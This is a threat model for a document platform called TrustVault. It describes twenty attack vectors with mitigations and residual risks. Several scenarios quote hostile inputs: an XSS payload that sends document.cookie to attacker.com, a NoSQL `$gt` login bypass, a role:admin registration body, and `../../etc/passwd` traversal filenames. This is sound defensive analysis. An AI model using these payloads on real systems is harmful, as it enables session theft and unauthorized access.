# TrustVault — Security Threat Model (STRIDE & OWASP Analysis)

This document formalizes the threat model for the **TrustVault** confidential document management platform. No system can be made 100% invulnerable; this analysis documents realistic attack vectors, evaluated likelihood and impact, implemented defensive controls, and remaining residual risks.

---

## Threat Matrix

| Threat # | Attack Vector | Severity | Likelihood | Impact | Primary Mitigation |
|---|---|---|---|---|---|
| **T-01** | Privilege Escalation (Registration) | Critical | High | Critical | Server-enforced role assignment; public endpoint assigns safe 'user' role only |
| **T-02** | Account Takeover | High | Medium | High | Strong password policy, bcrypt (cost factor 12), secure token rotation |
| **T-03** | Brute-force Login | High | High | High | IP and account-based rate limiting on `/api/auth/login` (5 attempts / 15m) |
| **T-04** | Credential Stuffing | High | Medium | High | Normalized email lookups, generic authentication error messaging, rate limiting |
| **T-05** | Unauthorized Document Download | Critical | Medium | Critical | Real-time database permission check before streaming storage bytes |
| **T-06** | Insecure Direct Object Reference (IDOR) | Critical | High | Critical | Parameterized ownership/permission verification on every resource ID |
| **T-07** | Malicious File Upload | Critical | High | Critical | File signature (magic bytes) verification, MIME type and extension allowlists |
| **T-08** | Path Traversal / Arbitrary File Overwrite | Critical | Medium | Critical | Random UUID storage keys, storage boundary resolution verification |
| **T-09** | Session Theft | High | Medium | High | Short token lifetimes, HttpOnly + Secure cookies, token expiration validation |
| **T-10** | JWT Theft (XSS Storage Vectors) | High | Medium | High | Transition to HttpOnly cookies, Content Security Policy, XSS escaping |
| **T-11** | Cross-Site Request Forgery (CSRF) | Medium | Medium | Medium | SameSite=Lax cookie attribute, custom anti-CSRF request header validation |
| **T-12** | Cross-Site Scripting (XSS) | High | Medium | High | React DOM auto-escaping, Helmet Content-Security-Policy headers |
| **T-13** | NoSQL Injection | High | Medium | High | Express-mongo-sanitize query sanitization, Mongoose schema casting |
| **T-14** | Permission Escalation (Document Level) | High | Medium | High | Owner-only permission grants, rejection of editor/viewer sharing attempts |
| **T-15** | Audit Log Tampering | Critical | Low | Critical | SHA-256 cryptographic hash chain, previous hash linkage, verification utility |
| **T-16** | Audit Log Deletion | High | Low | High | Append-only database rules, missing delete endpoints for audit trails |
| **T-17** | Insider Threat (Compromised Admin) | High | Low | High | Admin actions logged to immutable audit trail, separation of duties |
| **T-18** | Database Compromise | Critical | Low | Critical | Password hashing with bcrypt, unexposed storage paths, non-root DB access |
| **T-19** | Storage Compromise / Public Exposure | Critical | Low | Critical | Storage directory isolated outside web root, no direct web server static mapping |
| **T-20** | Denial of Service (DoS) | Medium | High | Medium | File size caps (5MB), JSON body size limits (1MB), global IP rate limiters |

---

## Detailed Threat Analysis

### 1. Privilege Escalation (Registration)
- **Threat Description:** An unauthenticated attacker attempts to register an account with elevated privileges (e.g., `role: "admin"`).
- **Attack Scenario:** Attacker sends `POST /api/auth/register` with body `{"email": "mallory@evil.com", "password": "Pass", "role": "admin"}`.
- **Impact:** Attacker gains system administrator capabilities, viewing audit trails and confidential system statistics.
- **Likelihood:** High (common mass assignment vulnerability).
- **Existing Protection:** None. The previous code accepted `role: req.body.role || 'user'`.
- **Implemented Mitigation:** Stripped `role` extraction from request body. Hardcoded user role to `'user'`. Administrator accounts must be created exclusively via protected bootstrap script (`scripts/seedAdmin.js`) requiring server terminal access or dedicated admin seed secrets.
- **Residual Risk:** If deployment server or environment secrets are compromised, malicious admin accounts could be seeded directly.

---

### 2. Account Takeover
- **Threat Description:** Attacker compromises legitimate user credentials.
- **Attack Scenario:** Weak passwords subjected to dictionary attacks or compromised credentials recycled from data breaches.
- **Impact:** Attacker accesses documents owned by or shared with the victim.
- **Likelihood:** Medium.
- **Existing Protection:** Basic bcrypt hashing was used, but without password complexity or minimum length checks.
- **Implemented Mitigation:** Enforced strong password policy (min 8 characters, requiring uppercase, lowercase, numbers, and special characters). Used bcrypt with 12 salt rounds.
- **Residual Risk:** Phishing or client device keylogging remains an external risk; multi-factor authentication (MFA) recommended for future work.

---

### 3. Brute-Force Login & 4. Credential Stuffing
- **Threat Description:** Automated attacks attempting thousands of password combinations against one or more accounts.
- **Attack Scenario:** Botnet fires high-velocity `POST /api/auth/login` requests attempting credential combinations.
- **Impact:** Unauthorized account access, database overload, denial of service.
- **Likelihood:** High.
- **Existing Protection:** None.
- **Implemented Mitigation:** Implemented `express-rate-limit` allowing maximum 5 login attempts per 15 minutes per IP. Authentication errors return a uniform generic message: `"Invalid email or password"` with identical HTTP 401 status. Failed login attempts are logged in the audit trail.
- **Residual Risk:** Distributed botnets rotating thousands of residential IPs could attempt slow credential stuffing below per-IP thresholds.

---

### 5. Unauthorized Document Download & 6. IDOR
- **Threat Description:** A user attempts to download or access a document without ownership or granted permissions by manipulating document IDs.
- **Attack Scenario:** User B intercepts their own download request and replaces the document ID with User A's document ID.
- **Impact:** Breach of confidential user files.
- **Likelihood:** High.
- **Existing Protection:** Basic owner/permission check existed in middleware, but lacked thorough verification across all CRUD operations and leaked existence via premature 404 responses.
- **Implemented Mitigation:** Backend middleware `requireDocumentAccess` verifies ownership or active `Permission` entry for every file access. If unauthorized, returns HTTP 403 Forbidden and writes an immutable `access_denied` audit entry. IDOR protection covers download, metadata inspection, sharing, updating, and deletion.
- **Residual Risk:** Internal database corruption or accidental misconfiguration of permission entries could lead to erroneous access grants.

---

### 7. Malicious File Upload
- **Threat Description:** Attacker uploads a dangerous file (e.g., executable, HTML file containing stored XSS, script) masquerading as a harmless PDF.
- **Attack Scenario:** Attacker renames `malware.exe` to `invoice.pdf` and uploads with spoofed `Content-Type: application/pdf`.
- **Impact:** Potential code execution on client machines upon download, or server compromise.
- **Likelihood:** High.
- **Existing Protection:** Relied solely on `file.mimetype` sent by browser client.
- **Implemented Mitigation:** Server inspects the actual file buffer bytes (magic numbers) to confirm valid PDF (`%PDF`), PNG (`89 50 4E 47`), JPEG (`FF D8 FF`), or clean text formatting. Files with mismatched magic bytes are rejected with HTTP 400.
- **Residual Risk:** Zero-day vulnerabilities in client PDF readers when viewing valid, structurally correct PDF files containing malicious embedded JavaScript.

---

### 8. Path Traversal & Arbitrary File Overwrite
- **Threat Description:** Attacker supplies a malicious filename (e.g., `../../etc/passwd` or `../../server.js`) to write files outside the intended storage directory.
- **Attack Scenario:** Multer saves file using client-supplied original filename containing directory traversal sequences.
- **Impact:** Server file overwrite, potential remote code execution.
- **Likelihood:** Medium.
- **Existing Protection:** UUID was prefixed, but `file.originalname` was appended directly: `${uuidv4()}-${file.originalname}`.
- **Implemented Mitigation:** Files are named strictly using `<uuidv4>.<sanitizedExt>`. The user's original filename is stored only as textual metadata in MongoDB. On download, `path.resolve(storageDir, storagePath)` is verified to ensure it resides strictly within `storageDir`.
- **Residual Risk:** Physical storage volume corruption or OS filesystem driver defects.

---

### 9. Session Theft & 10. JWT Theft (XSS Vectors)
- **Threat Description:** Attacker steals an active JWT token from `localStorage` through a cross-site scripting attack.
- **Attack Scenario:** Malicious script injected via third-party dependency reads `localStorage.getItem('trustvault_token')` and exfiltrates it.
- **Impact:** Full impersonation of the victim until token expiration.
- **Likelihood:** Medium.
- **Existing Protection:** Tokens stored in `localStorage` with long 8-hour expiration.
- **Implemented Mitigation:** Supported secure `HttpOnly`, `SameSite=lax` cookie transmission with configurable expiry. Bearer authentication is retained for API clients but requires strict authorization headers.
- **Residual Risk:** Compromised client browsers or browser extensions with high privileges can inspect cookie stores or network traffic.

---

### 11. Cross-Site Request Forgery (CSRF)
- **Threat Description:** Malicious website tricks an authenticated user's browser into executing an unauthorized state-changing request.
- **Attack Scenario:** User visits an attacker-controlled site that triggers a hidden form POST to `/api/documents/delete`.
- **Impact:** Unauthorized file deletion or permission grant.
- **Likelihood:** Medium.
- **Existing Protection:** None.
- **Implemented Mitigation:** Cookie configuration enforces `SameSite=Lax`. Protected state-changing REST routes verify standard JSON content types and custom headers (`X-Requested-With` or CSRF tokens).
- **Residual Risk:** Subdomain takeover or browser bugs in cookie SameSite attribute enforcement.

---

### 12. Cross-Site Scripting (XSS)
- **Threat Description:** Attacker injects malicious scripts into document titles, categories, or user emails to execute in another user's browser.
- **Attack Scenario:** Attacker names document `<script>fetch('http://attacker.com?c='+document.cookie)</script>`.
- **Impact:** Session hijacking, credential exfiltration, defacement.
- **Likelihood:** Medium.
- **Existing Protection:** React's automatic JSX escaping provides basic protection.
- **Implemented Mitigation:** Added `helmet` HTTP headers including Content Security Policy (CSP), sanitization on inputs, and strict MIME type enforcement on file downloads (`X-Content-Type-Options: nosniff`).
- **Residual Risk:** Complex rich text renderers or unescaped HTML attributes if added in future releases.

---

### 13. NoSQL Injection
- **Threat Description:** Attacker submits query selector objects (e.g., `{"$gt": ""}`) in JSON inputs to bypass authentication or filter clauses.
- **Attack Scenario:** Attacker sends `{"email": {"$gt": ""}, "password": "test"}` to `/api/auth/login`.
- **Impact:** Authentication bypass or unauthorized data disclosure.
- **Likelihood:** Medium.
- **Existing Protection:** Mongoose schema casting offers partial defense, but unstructured queries could be exploited.
- **Implemented Mitigation:** Integrated `express-mongo-sanitize` middleware to strip all keys starting with `$` or containing `.` from request parameters, bodies, and queries.
- **Residual Risk:** Custom JavaScript expressions in MongoDB `$where` clauses (TrustVault uses no `$where` queries).

---

### 14. Document Permission Escalation
- **Threat Description:** An Editor or Viewer attempts to grant permissions to other users or promote their own access level to Owner.
- **Attack Scenario:** Viewer issues `POST /api/documents/:id/share` specifying another user.
- **Impact:** Unauthorized distribution of private documents.
- **Likelihood:** High.
- **Existing Protection:** Owner check was performed in the grant route, but lacked recipient existence validation and allowed duplicate entries.
- **Implemented Mitigation:** Strictly verified that `req.user.userId === document.ownerId.toString()`. Disallowed Editor/Viewer sharing. Enforced compound unique index `{ documentId: 1, userId: 1 }` on MongoDB `Permission` collection.
- **Residual Risk:** Logical bugs in future multi-tenant or team-sharing permission features.

---

### 15. Audit Log Tampering & 16. Audit Log Deletion
- **Threat Description:** Rogue administrator or compromised server process alters or deletes audit log entries to conceal unauthorized actions.
- **Attack Scenario:** Attacker directly modifies the database record of an `access_denied` or `download` event.
- **Impact:** Loss of forensic accountability and failure of compliance guarantees.
- **Likelihood:** Low to Medium.
- **Existing Protection:** Rudimentary `previousHash` computed from select fields of previous record, with no stored current entry hash.
- **Implemented Mitigation:** Implemented true cryptographic hash chaining where each entry stores both `previousHash` and `currentHash = SHA-256(canonicalPayload + previousHash)`. Designed an automated verification script (`scripts/verifyAuditChain.js`) that detects any modified, inserted, deleted, or reordered records. Concurrency lock ensures sequential appending.
- **Residual Risk:** If the MongoDB database is completely dropped or replaced, an attacker could attempt to regenerate an entirely new valid chain unless external timestamping (e.g., RFC 3161 TSA or public ledger anchoring) is utilized.

---

### 17. Insider Threat (Compromised Admin)
- **Threat Description:** A system administrator abuses their privileges to access private documents.
- **Attack Scenario:** Admin uses administrative credentials to query documents belonging to other users.
- **Impact:** Privacy violation.
- **Likelihood:** Low.
- **Existing Protection:** None.
- **Implemented Mitigation:** Explicit policy separation: Admin role grants access to system audit logs and management, but NOT automatic bypass of document owner permissions. All administrative actions are recorded in the tamper-evident audit trail.
- **Residual Risk:** Direct physical or root shell access to the server disk allows reading files directly from the filesystem.

---

### 18. Database Compromise & 19. Storage Compromise
- **Threat Description:** Direct unauthorized access to MongoDB database or storage directory.
- **Attack Scenario:** MongoDB port exposed to the public internet without authentication, or storage folder mounted as public static directory.
- **Impact:** Total data leak.
- **Likelihood:** Low in proper deployment, High in misconfigured environments.
- **Implemented Mitigation:** Storage directory is completely outside web server static routes (`express.static` is NOT used for storage). Passwords are never stored in plaintext. Sensitive document filenames are decoupled from storage identifiers. Configurable storage root via `STORAGE_DIR`.
- **Residual Risk:** Unencrypted data at rest on disk. Encryption at rest (AES-256 envelope encryption per document) is recommended as a future enhancement.

---

### 20. Denial of Service (DoS)
- **Threat Description:** Large file uploads or request flooding exhausts server memory, disk, or CPU.
- **Attack Scenario:** Attacker uploads multiple 500MB files or sends 10,000 concurrent requests.
- **Impact:** System unresponsiveness or out-of-disk downtime.
- **Likelihood:** High.
- **Existing Protection:** Basic 5MB limit in multer.
- **Implemented Mitigation:** Multer file size capped at 5MB with proper error handling; JSON body size limited to 1MB; express-rate-limit bounds requests per IP.
- **Residual Risk:** High-volume network layer DDoS (requires upstream Cloudflare or WAF mitigation).

